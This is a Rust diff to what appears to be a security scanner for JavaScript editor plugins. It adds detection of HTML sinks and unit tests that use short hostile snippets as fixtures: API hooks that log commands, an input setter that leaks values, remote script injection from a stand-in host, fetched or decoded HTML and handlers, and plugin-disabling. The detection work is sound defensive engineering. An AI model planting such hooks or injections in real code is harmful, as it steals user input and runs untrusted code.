@@ -450,6 +450,19 @@ impl<'s> Resolver<'s> {
             ),
             path: self.resolve(expr),
             is_object: matches!(expr.get_inner_expression(), Expression::ObjectExpression(_)),
+            object_keys: match expr.get_inner_expression() {
+                Expression::ObjectExpression(object) => object
+                    .properties
+                    .iter()
+                    .filter_map(|property| match property {
+                        ObjectPropertyKind::ObjectProperty(property) => {
+                            property.key.static_name().map(|name| name.to_string())
+                        }
+                        _ => None,
+                    })
+                    .collect(),
+                _ => Vec::new(),
+            },
             http_method: self.object_field(expr, "method"),
             fetch_url: self.fetch_url(expr),
         }
@@ -963,8 +976,28 @@ impl<'a> Visit<'a> for Scanner<'_, '_, '_, '_> {
                 .as_member_expression()
                 .and_then(|member| self.resolver.member_path(member)),
         };
+        let script_element = target
+            .as_deref()
+            .is_some_and(|target| target.starts_with("$element:script."));
         if let Some(target) = target {
             self.classify_assignment(it.span, &target, &it.right);
+        }
+        // HTML sinks are usually on local elements the resolver can't name,
+        // so they are matched by property alone.
+        if !script_element
+            && let Some(sink @ ("innerHTML" | "outerHTML" | "srcdoc")) = it
+                .left
+                .as_member_expression()
+                .and_then(|member| member.static_property_name())
+        {
+            let html = self.resolver.arg_info(&it.right);
+            rules::classify_html_sink(
+                self.ctx,
+                it.span,
+                sink,
+                &html,
+                self.remote_callback_depth > 0,
+            );
         }
         walk::walk_assignment_expression(self, it);
     }
@@ -1498,6 +1531,121 @@ mod tests {
         assert!(!has(
             "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'bin')).createDirectory('lsp')",
             "tampering.plugin_files"
+        ));
+    }
+
+    #[test]
+    fn detects_hooks_on_shared_globals() {
+        assert!(has(
+            "const real = Executor.execute; Executor.execute = (c, ...a) => { log(c); return real(c, ...a) }",
+            "tampering.native_api"
+        ));
+        assert!(has("window.system = proxy", "tampering.native_api"));
+        assert!(has(
+            "EventTarget.prototype.addEventListener = wrapped",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "Object.defineProperty(HTMLInputElement.prototype, 'value', { set(v) { leak(v) } })",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "document.head.appendChild = function (el) { return el }",
+            "tampering.dom_hook"
+        ));
+        assert!(has(
+            "window.adRewardedUnitId = 'ca-app-pub-x/y'",
+            "tampering.ads"
+        ));
+        assert!(has(
+            "const s = acode.require('settings'); s.value.pluginsDisabled['other.plugin'] = true",
+            "tampering.plugin_settings"
+        ));
+        // Polyfills for harmless members and the plugin's own objects are fine.
+        assert!(
+            !ids("if (!Element.prototype.matches) Element.prototype.matches = m")
+                .iter()
+                .any(|id| id.starts_with("tampering."))
+        );
+        // core-js `make-built-in`, present in most bundles.
+        assert!(!has(
+            "Function.prototype.toString = y(function(){ return s(this) }, 'toString')",
+            "tampering.dom_hook"
+        ));
+        assert!(
+            !ids("const sys = {}; sys.execute = f; this.system = 1")
+                .iter()
+                .any(|id| id.starts_with("tampering."))
+        );
+    }
+
+    #[test]
+    fn detects_html_and_attribute_sinks() {
+        assert!(has(
+            "const s = document.createElement('script'); s.setAttribute('src', 'https://e.vil/x.js'); document.head.append(s)",
+            "dynamic.remote_script"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { document.createRange().createContextualFragment(h) })",
+            "dynamic.remote_code"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { frame.srcdoc = h })",
+            "dynamic.remote_code"
+        ));
+        assert!(has(
+            "fetch(u).then(r => r.text()).then(h => { el.innerHTML = h })",
+            "dynamic.remote_html"
+        ));
+        assert!(has(
+            "el.insertAdjacentHTML('beforeend', atob(p))",
+            "dynamic.decoded_html"
+        ));
+        assert!(has(
+            "el.setAttribute('onclick', atob(p))",
+            "dynamic.decoded_exec"
+        ));
+        assert!(has(
+            "el.innerHTML = '<img src=x onerror=\"go()\">'",
+            "dynamic.inline_handler"
+        ));
+        // Plain markup and attributes are fine.
+        assert!(
+            !ids("el.innerHTML = '<b>' + name + '</b>'; el.setAttribute('class', c)")
+                .iter()
+                .any(|id| id.starts_with("dynamic."))
+        );
+        // A script element's own text is the existing inline-script rule.
+        assert!(!has(
+            "const s = document.createElement('script'); s.innerHTML = code",
+            "dynamic.remote_html"
+        ));
+    }
+
+    #[test]
+    fn classifies_webview_and_plugin_settings() {
+        let webview = "const webview = acode.require('webview');
+            async function open() {
+              const view = await webview.create({ mode: 'fullscreen' });
+              await view.loadURL('https://login.example.net/');
+              await view.evaluate('document.title');
+            }";
+        assert!(has(webview, "acode.webview"));
+        assert!(has(webview, "acode.webview_remote_page"));
+        assert!(has(webview, "acode.webview_script"));
+        // Same method names without the webview module are someone else's.
+        assert!(!has(
+            "page.loadURL('https://x.io')",
+            "acode.webview_remote_page"
+        ));
+
+        assert!(has(
+            "const settings = acode.require('settings'); settings.update({ pluginsDisabled: { 'other.plugin': true } })",
+            "tampering.plugin_settings"
+        ));
+        assert!(!has(
+            "acode.require('settings').update({ fontSize: '14px' })",
+            "tampering.plugin_settings"
         ));
     }
 
